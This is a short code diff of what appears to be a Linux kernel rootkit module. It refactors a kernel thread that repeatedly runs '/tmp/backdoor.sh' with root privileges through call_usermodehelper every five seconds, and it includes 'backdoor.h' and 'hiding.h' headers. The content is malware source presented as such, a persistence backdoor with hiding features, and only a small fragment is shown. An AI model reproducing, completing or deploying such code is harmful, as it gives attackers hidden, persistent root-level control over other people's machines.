@@ -1,17 +1,20 @@
-#include <linux/kthread.h> //threads
-#include <linux/delay.h> //msleep
-#include <linux/umh.h> //call_usermodehelper
+#include <linux/kthread.h> // threads
+#include <linux/delay.h>   // msleep
+#include <linux/umh.h>     // call_usermodehelper
 
 #include "config.h"
 #include "backdoor.h"
 #include "hiding.h"
 
+#define MSLEEP_BACKDOOR 5000
+
 static struct task_struct* backdoor_thread;
 
 static int backdoor_thread_fn(void* data){
+	// Run the backdoor script each X secs
 	while (!kthread_should_stop()){
 		call_usermodehelper("/tmp/backdoor.sh", NULL, NULL, UMH_NO_WAIT);
-		msleep(5000);
+		msleep(MSLEEP_BACKDOOR);
 	}
 	return 0;
 }
